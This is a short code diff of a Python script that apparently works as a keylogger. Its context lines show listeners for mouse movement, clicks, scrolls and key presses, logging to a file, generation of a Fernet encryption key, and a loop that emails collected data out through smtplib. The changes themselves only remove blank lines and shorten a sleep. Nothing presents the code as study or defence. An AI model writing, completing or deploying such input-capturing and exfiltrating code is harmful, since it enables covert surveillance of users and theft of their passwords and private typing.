@@ -7,10 +7,6 @@ from time import time, sleep
 import smtplib
 
 
-
-
-
-
 logging.basicConfig(filename="mouse_log.txt", level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
 def on_move(x, y):
@@ -58,19 +54,9 @@ listener.start()
 with Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll,on_press=on_press) as listener:
     listener.join()
 
+               
         
-
-        
-        
-        
-        
-        
-time.sleep(100) # Sleep for 100 seconds
-
-
-
-
-
+time.sleep(10) # Sleep for 10 seconds
 
 
 key = Fernet.generate_key()
@@ -133,5 +119,3 @@ while True:
         server.sendmail(sender, receiver, text)
 
    
-
-        
